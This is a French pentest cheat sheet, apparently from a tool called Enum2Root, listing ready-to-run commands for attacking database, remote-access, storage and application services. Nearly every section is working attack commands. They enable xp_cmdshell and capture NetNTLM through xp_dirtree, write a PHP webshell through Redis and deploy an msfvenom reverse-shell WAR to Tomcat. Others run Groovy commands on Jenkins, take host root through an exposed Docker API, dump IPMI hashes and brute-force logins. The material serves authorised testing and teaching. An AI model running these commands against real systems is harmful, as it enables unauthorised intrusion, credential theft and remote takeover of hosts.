# 1 - Énumération des services (2/2)

Cette page couvre les services moins courants de la phase d'énumération : bases de données (MS SQL, MySQL, PostgreSQL, Oracle, MongoDB, Redis), services de gestion à distance (RDP, WinRM, VNC), partages et API (NFS, rsync, Docker), serveurs d'applications (Tomcat, Jenkins, AJP) et matériel d'administration (IPMI / BMC). Chaque section reprend les commandes exactes d'Enum2Root et renvoie vers des références vérifiées (HackTricks et documentation officielle des outils ou éditeurs).

!!! note "Jetons"
    Les commandes utilisent des jetons à substituer par vos valeurs :

    - `{IP}` - adresse IP de la cible
    - `{DOMAIN}` - domaine Active Directory (ex. `target.local`)
    - `{URL}` - URL de base du service web
    - `{USER}` - nom d'utilisateur
    - `{PASS}` - mot de passe (ou hash NT pour le pass-the-hash)
    - `<listener_ip>`, `<SID>`, `<module>`, `<share>`, `<export>`, `<db>`, `<col>` - valeurs à adapter au contexte

    Les `needs` indiqués après certains titres d'étape sont des **prérequis** : il faut déjà disposer de l'élément cité (compte, identifiants, hash, droits) pour exécuter l'étape.

## 1433 - MS SQL Server

MS SQL Server (`MSSQL`). Authentification SQL ou Windows. `xp_cmdshell` = exécution de commandes (rôle sysadmin requis).

!!! info "Références"
    - [HackTricks - Pentesting MSSQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
    - [impacket - dépôt officiel (Fortra)](https://github.com/fortra/impacket)
    - [Microsoft Learn - xp_cmdshell (Transact-SQL)](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)

### Connexion *(prérequis : authentification)*

```bash
impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{IP} -windows-auth
```

**Voir aussi :** [impacket - mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) · [Kali - impacket](https://www.kali.org/tools/impacket/)

### Énumération des bases *(prérequis : authentification)*

```sql
SELECT name FROM master.dbo.sysdatabases;
enum_db
```

### RCE via xp_cmdshell (si sysadmin) *(prérequis : authentification)*

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Voir aussi :** [Microsoft Learn - xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql)

### Capture/relais NetNTLM (xp_dirtree) *(prérequis : authentification)*

```sql
EXEC master..xp_dirtree '\\<listener_ip>\share';  -- responder/ntlmrelayx listening
```

**Voir aussi :** [HackTricks - Types of MSSQL users](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/types-of-mssql-users.html)

## 3306 - MySQL

MySQL (`MySQL`). Tentez `root` sans mot de passe.

!!! info "Références"
    - [HackTricks - Pentesting MySQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html)
    - [GTFOBins - mysql](https://gtfobins.github.io/gtfobins/mysql/)

### Connexion root sans mot de passe

```bash
mysql -h {IP} -u root
```

### Connexion authentifiée *(prérequis : identifiants)*

```bash
mysql -h {IP} -u {USER} -p
```

### Énumération *(prérequis : identifiants)*

```sql
SHOW DATABASES; SELECT user,authentication_string FROM mysql.user;
```

## 2049 - NFS

NFS (`NFS`). Escalade possible via `no_root_squash`.

!!! info "Références"
    - [HackTricks - NFS service pentesting](https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html)

### Lister les exports

```bash
showmount -e {IP}
```

### Monter un export

```bash
mkdir /mnt/nfs
sudo mount -t nfs -o vers=3 {IP}:/<export> /mnt/nfs -o nolock
```

## 3389 - RDP

RDP (`RDP`). Testez NLA et les identifiants éventuellement obtenus.

!!! info "Références"
    - [HackTricks - Pentesting RDP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html)
    - [CVE-2019-0708 (BlueKeep) - CVE.org](https://www.cve.org/CVERecord?id=CVE-2019-0708)
    - [Kali - freerdp3](https://www.kali.org/tools/freerdp3/)

### Vuln BlueKeep

```bash
sudo nmap -p3389 --script rdp-vuln-ms12-020 {IP}
```

**Voir aussi :** [Nmap NSE - rdp-vuln-ms12-020](https://nmap.org/nsedoc/scripts/rdp-vuln-ms12-020.html)

### Vérifier l'accès *(prérequis : authentification)*

```bash
nxc rdp {IP} -u {USER} -p {PASS}
```

### Session graphique *(prérequis : identifiants)*

```bash
xfreerdp /v:{IP} /u:{USER} /p:'{PASS}' /cert:ignore +clipboard /dynamic-resolution
```

**Voir aussi :** [Kali - freerdp3](https://www.kali.org/tools/freerdp3/)

### Pass-the-hash RDP (Restricted Admin) *(prérequis : hash NT)*

```bash
xfreerdp /v:{IP} /u:{USER} /pth:{PASS} /cert:ignore
```

## 5985/5986 - WinRM

WinRM (`WinRM`). Un membre de **Remote Management Users** obtient un shell direct.

!!! info "Références"
    - [HackTricks - Pentesting WinRM](https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html)
    - [Evil-WinRM - dépôt officiel](https://github.com/Hackplayers/evil-winrm)
    - [Kali - evil-winrm](https://www.kali.org/tools/evil-winrm/)

### Vérifier l'accès *(prérequis : authentification)*

```bash
nxc winrm {IP} -u {USER} -p {PASS}
```

### Shell interactif *(prérequis : identifiants)*

```bash
evil-winrm -i {IP} -u {USER} -p '{PASS}'
```

**Voir aussi :** [Evil-WinRM - dépôt officiel](https://github.com/Hackplayers/evil-winrm)

### Shell pass-the-hash *(prérequis : hash NT)*

```bash
evil-winrm -i {IP} -u {USER} -H {PASS}
```

## 6379 - Redis

Redis (`Redis`). Souvent sans authentification. RCE possible via écriture de fichier ou modules.

!!! info "Références"
    - [HackTricks - Pentesting Redis](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)
    - [Redis - redis-cli](https://redis.io/docs/latest/develop/connect/cli/)
    - [Redis - Security](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)

### Connexion / info / config

```bash
redis-cli -h {IP}
redis-cli -h {IP} INFO
redis-cli -h {IP} CONFIG GET '*'
```

**Voir aussi :** [Redis - redis-cli](https://redis.io/docs/latest/develop/connect/cli/)

### Lister / lire les clés

```bash
redis-cli -h {IP} --scan
redis-cli -h {IP} KEYS '*'
```

### Webshell via écriture de fichier

```bash
redis-cli -h {IP} config set dir /var/www/html
redis-cli -h {IP} config set dbfilename shell.php
redis-cli -h {IP} set x '<?php system($_GET["c"]); ?>'
redis-cli -h {IP} save
```

**Voir aussi :** [Redis - Security](https://redis.io/docs/latest/operate/oss_and_stack/management/security/)

## 5432 - PostgreSQL

PostgreSQL (`PostgreSQL`). Tentez `postgres`/`postgres`. RCE via `COPY ... PROGRAM` (superuser).

!!! info "Références"
    - [HackTricks - Pentesting PostgreSQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html)
    - [PostgreSQL - COPY](https://www.postgresql.org/docs/current/sql-copy.html)

### Connexion

```bash
psql 'host={IP} user=postgres password=postgres'
nxc postgres {IP} -u postgres -p postgres
```

### Énumération

```sql
\l   -- databases
\du  -- roles
SELECT version();
```

### RCE (COPY TO PROGRAM)

```sql
COPY (SELECT '') TO PROGRAM 'id';
```

**Voir aussi :** [PostgreSQL - COPY](https://www.postgresql.org/docs/current/sql-copy.html)

## 1521 - Oracle

Oracle TNS (`Oracle TNS`). `odat` = couteau suisse. Brute des SID puis des comptes.

!!! info "Références"
    - [HackTricks - Pentesting Oracle TNS](https://book.hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener.html)
    - [ODAT - dépôt officiel](https://github.com/quentinhardy/odat)
    - [Kali - odat](https://www.kali.org/tools/odat/)

### Énumération SID / version

```bash
odat all -s {IP}
tnscmd10g version -h {IP}
```

**Voir aussi :** [Kali - tnscmd10g](https://www.kali.org/tools/tnscmd10g/)

### Brute des comptes

```bash
odat passwordguesser -s {IP} -d <SID>
```

**Voir aussi :** [ODAT - dépôt officiel](https://github.com/quentinhardy/odat)

## 873 - rsync

rsync (`rsync`). Les modules sont parfois listables/téléchargeables sans authentification.

!!! info "Références"
    - [HackTricks - Pentesting rsync](https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html)
    - [GTFOBins - rsync](https://gtfobins.github.io/gtfobins/rsync/)
    - [rsyncd.conf - manuel](https://download.samba.org/pub/rsync/rsyncd.conf.5.html)

### Lister les modules

```bash
rsync -av --list-only rsync://{IP}/
```

### Télécharger un module

```bash
rsync -av rsync://{IP}/<module>/ ./loot/
```

## 8080 - Apache Tomcat

Apache Tomcat (`Tomcat`). Identifiants par défaut `tomcat/tomcat`, `admin/admin`. Déployer un WAR = RCE.

!!! info "Références"
    - [HackTricks - Pentesting Tomcat](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html)
    - [Apache Tomcat - Manager App HOW-TO](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)

### Accès au Manager

```bash
# /manager/html  /host-manager/html
hydra -L users.txt -P pass.txt {IP} -s 8080 http-get /manager/html
```

**Voir aussi :** [Apache Tomcat - Manager App HOW-TO](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html) · [Kali - hydra](https://www.kali.org/tools/hydra/)

### Déployer un webshell WAR *(prérequis : identifiants)*

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<listener_ip> LPORT=4444 -f war -o shell.war
curl -u {USER}:{PASS} -T shell.war '{URL}:8080/manager/text/deploy?path=/shell'
```

**Voir aussi :** [Kali - Metasploit Framework (msfvenom)](https://www.kali.org/tools/metasploit-framework/)

## 8080 - Jenkins

Jenkins (`Jenkins`). La console Groovy = RCE. Tentez `admin/admin` et l'accès anonyme.

!!! info "Références"
    - [HackTricks Cloud - Jenkins Security](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/index.html)

### Détection

```bash
curl -s {URL}:8080/login | grep -i jenkins
# endpoints: /script  /scriptText  /asynchPeople/
```

### RCE via Groovy (Script Console) *(prérequis : identifiants)*

```groovy
# in /script:
"id".execute().text
# full Groovy reverse shell: revshells.com (Groovy option)
```

**Voir aussi :** [HackTricks Cloud - Jenkins Security](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/index.html)

## 2375 - Docker API

Docker API (`Docker`). Une API non authentifiée = root sur l'hôte via le montage de `/`.

!!! info "Références"
    - [HackTricks - Pentesting Docker (2375)](https://book.hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html)
    - [Docker - Engine API reference](https://docs.docker.com/reference/api/engine/)

### Lister

```bash
docker -H tcp://{IP}:2375 ps
curl -s http://{IP}:2375/version
```

**Voir aussi :** [Docker - Engine API reference](https://docs.docker.com/reference/api/engine/)

### Évasion (monter le FS de l'hôte)

```bash
docker -H tcp://{IP}:2375 run -v /:/mnt -it alpine chroot /mnt sh
```

## 8009 - AJP / Ghostcat (CVE-2020-1938)

AJP (`AJP`). Lecture/inclusion de fichiers via le connecteur AJP de Tomcat.

!!! info "Références"
    - [HackTricks - Pentesting AJP (8009)](https://book.hacktricks.wiki/en/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.html)
    - [CVE-2020-1938 (Ghostcat) - CVE.org](https://www.cve.org/CVERecord?id=CVE-2020-1938)
    - [Ghostcat-CNVD-2020-10487 (ajpShooter) - dépôt](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

### Lire WEB-INF/web.xml

```bash
python3 ajpShooter.py http://{IP} 8009 /WEB-INF/web.xml read
```

**Voir aussi :** [Ghostcat-CNVD-2020-10487 (ajpShooter) - dépôt](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

## 27017 - MongoDB

MongoDB (`MongoDB`). Souvent sans authentification.

!!! info "Références"
    - [HackTricks - Pentesting MongoDB (27017)](https://book.hacktricks.wiki/en/network-services-pentesting/27017-27018-mongodb.html)
    - [MongoDB - mongosh (MongoDB Shell)](https://www.mongodb.com/docs/mongodb-shell/)

### Connexion / énumération

```bash
mongosh mongodb://{IP}:27017
# show dbs ; use <db> ; show collections ; db.<col>.find()
```

**Voir aussi :** [MongoDB - mongosh (MongoDB Shell)](https://www.mongodb.com/docs/mongodb-shell/)

## 5900 - VNC

VNC (`VNC`). Mot de passe parfois faible ou absent.

!!! info "Références"
    - [HackTricks - Pentesting VNC](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html)
    - [Kali - hydra](https://www.kali.org/tools/hydra/)

### Connexion

```bash
vncviewer {IP}::5900
```

### Brute force

```bash
hydra -P /usr/share/wordlists/rockyou.txt vnc://{IP}
```

**Voir aussi :** [Kali - hydra](https://www.kali.org/tools/hydra/)

## 623 - IPMI / BMC

IPMI / BMC (`IPMI`). Dump de hash via RAKP (CVE-2013-4786), même sans identifiants.

!!! info "Références"
    - [HackTricks - IPMI (623/UDP)](https://book.hacktricks.wiki/en/network-services-pentesting/623-udp-ipmi.html)
    - [CVE-2013-4786 (IPMI RAKP) - CVE.org](https://www.cve.org/CVERecord?id=CVE-2013-4786)
    - [Kali - Metasploit Framework](https://www.kali.org/tools/metasploit-framework/)

### Dump des hash

```bash
msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
# crack: hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt
```

**Voir aussi :** [CVE-2013-4786 (IPMI RAKP) - CVE.org](https://www.cve.org/CVERecord?id=CVE-2013-4786)
